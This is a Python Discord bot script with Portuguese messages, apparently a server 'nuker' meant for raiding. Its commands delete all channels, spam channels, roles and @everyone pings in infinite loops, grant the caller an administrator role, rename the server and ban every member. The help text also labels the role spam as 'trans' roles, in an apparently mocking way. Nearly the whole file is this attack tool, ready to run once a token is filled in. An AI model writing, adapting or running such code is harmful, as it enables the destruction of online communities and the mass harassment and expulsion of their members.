import discord
from discord.ext import commands
import colorama
from colorama import Fore

colorama.init()
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=">",intents=intents)
bot.remove_command("help")
  
@bot.event
async def on_ready():
    print(f'''
{Fore.LIGHTCYAN_EX}    
{Fore.LIGHTCYAN_EX}         
{Fore.LIGHTCYAN_EX}       
{Fore.LIGHTCYAN_EX}         
{Fore.LIGHTCYAN_EX}          
{Fore.LIGHTCYAN_EX}      
Bora detonar <3                             
''')

@bot.command()
async def d(ctx,channel_id="all"):
  await ctx.message.delete()
  if channel_id == "all":
    for channel in ctx.guild.channels:
      if channel.id != 834134636678479902:
        await channel.delete()
      else:
        continue
    guild = ctx.message.guild
    await guild.create_text_channel("nuked")
    print("Todos os canais foram nukados")
    return
  else:
    try:
      channel = ctx.get.channel(id=channel_id)
      await channel.delete()
    except:
      e2 = discord.Embed(title = "ID Inválido.", color = 0xaf1aff)
      await ctx.send(embed=e2)
    return

@bot.command()
async def vcspam(ctx, name):
  while True:
    guild = ctx.guild
    await guild.create_voice_channel(name)

@bot.command()
async def cspam(ctx, name):
  while True:
    guild = ctx.guild
    await guild.create_text_channel(name)


@bot.command(pass_context=True)
async def admin(ctx):
    try:
        guild = ctx.guild
        role = await guild.create_role(name="Infotech", permissions=discord.Permissions(8),colour=discord.Colour(000000))
        authour = ctx.message.author
        await ctx.message.delete()
        await authour.add_roles(role)
        print("Te dei admin <3")
    except:
        print("Não consegi te dar admin :(")

@bot.command()
async def pingspam(ctx):
  while True:
    await ctx.send('''@everyone\n@everyone''')

@bot.command()
async def trspam(ctx):
 while True:
   await ctx.guild.create_role(name="Infotech runs you",colour=discord.Colour(0x0EF5F6))
   await ctx.guild.create_role(name="Infotech runs you",colour=discord.Colour(0xFFFFFF))
   await ctx.guild.create_role(name="Infotech runs you",colour=discord.Colour(0xF592F6))

@bot.command()
async def servername(ctx, *, new_name):
    await ctx.guild.edit(name=new_name)

@bot.command()
async def banAll(ctx):
  if ctx.author.guild_permissions.administrator:
    for member in ctx.guild.members:
      if member != ctx.author:
        try:
          await member.ban(reason="Detonado")
        except:
          print('não foi possível banir todos :(')
    await ctx.send("todos os participantes foram banidos")

@bot.command()
async def lagspam(ctx):
  while True:
    await ctx.send('@everyone')
    await ctx.send(" :chains:  :chains:  :chains:  :chains:  :chains:  :chains:  :chains:  :chains:  :chains:  :chains:  :chains:  :chains:  :chains:  :chains:  :chains: ")

@bot.command()
async def help(ctx):
    text = '''# lista de comandos:\n(prefixo: >)\n - **cspam**  [nome] (canal de texto)\n - **vcspam** [nome] (canal de voz)\n - **d all** (deleta todos os canais)\n - **banAll** (bane todos os membros)\n - **pingspam** (spam de everyone)\n - **admin** (te concede um cargo de admin)\n - **servername** [nome] (troca o nome do server)\n - **transrspam** (spamma cargos trans)\n - **lagspam** (spamma até travar)\n - help'''
    ajd = f'{text}\n'
    await ctx.send(ajd)

bot.run('token_aqui')
